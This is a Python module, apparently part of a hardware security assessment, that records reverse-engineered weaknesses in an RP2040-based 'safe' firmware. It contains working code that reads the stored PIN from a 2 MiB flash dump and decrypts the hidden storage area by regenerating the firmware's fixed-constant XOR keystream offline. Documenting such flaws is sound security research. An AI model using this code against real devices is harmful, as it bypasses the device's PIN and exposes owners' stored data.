#!/usr/bin/env python3
"""Reverse-engineered facts about the RP2040 safe firmware

Two things live here, both recovered from a full 2 MiB flash dump:

1. extract_pin: the stored PIN reference. The firmware keeps it in flash and a
   pointer at offset 0xE10 points to it. The PIN gates only the USB visibility;
   it does not enter the storage cipher.
2. decrypt: the storage cipher. The USB READ(10) path decrypts each 16-byte
   block with a homemade XOR keystream driven by fixed firmware constants, not
   by the PIN. So the hidden volume decrypts offline, straight from a dump

Constants come from the report vectors attack7 (PIN) and attack1 (cipher)
"""
import struct
from pathlib import Path

XIP_BASE = 0x10000000
REFERENCE_POINTER_OFFSET = 0xE10

STORAGE_OFF = 0x100000   # the hidden storage starts here in the dump
STORAGE_LEN = 0xB0000    # 704 KiB
SECTOR = 512

MUL_LBA = 0x38C9CDA0
SEED = 0x9E37A9EA
INC_BLK = 0x41C64E6D

LANES = [0x61C8864F, 0x00000000, 0x9E3779B1, 0x3C6EF362,
         0xDAA66D13, 0x78DDE6C4, 0x17156075, 0xB54CDA26,
         0x538453D7, 0xF1BBCD88, 0x8FF34739, 0x2E2AC0EA,
         0xCC623A9B, 0x6A99B44C, 0x08D12DFD, 0xA708A7AE]


def extract_pin(path):
    """Read the stored PIN reference from a full 2 MiB flash dump"""
    image = Path(path).read_bytes()
    if len(image) != 0x200000:
        raise ValueError("Expected a full 2 MiB flash dump")

    address = struct.unpack_from("<I", image, REFERENCE_POINTER_OFFSET)[0]
    offset = address - XIP_BASE
    if not 0 <= offset < 0x100000 or offset + 5 > len(image):
        raise ValueError(f"PIN reference points outside firmware: 0x{address:08x}")

    reference = image[offset:offset + 5]
    if reference[0] != 0 or any(digit > 9 for digit in reference[1:]):
        raise ValueError(f"Invalid PIN reference at 0x{address:08x}")
    return "".join(str(digit) for digit in reference[1:])


def keystream_block(lba, j):
    """The 16-byte keystream for block j of absolute sector lba"""
    s = (lba * MUL_LBA + SEED + j * INC_BLK) & 0xFFFFFFFF
    return bytes(((s + c) & 0xFFFFFFFF) >> 24 for c in LANES)


def decrypt(dump_path):
    """Decrypt the hidden storage area of a full flash dump; return the plaintext"""
    with open(dump_path, "rb") as f:
        f.seek(STORAGE_OFF)
        buf = bytearray(f.read(STORAGE_LEN))
    if len(buf) != STORAGE_LEN:
        raise ValueError(
            f"Incomplete encrypted storage: expected {STORAGE_LEN} bytes, got {len(buf)}"
        )
    for lba in range(len(buf) // SECTOR):
        for j in range(SECTOR // 16):
            off = lba * SECTOR + j * 16
            ks = keystream_block(lba, j)
            for k in range(16):
                buf[off + k] ^= ks[k]
    return bytes(buf)
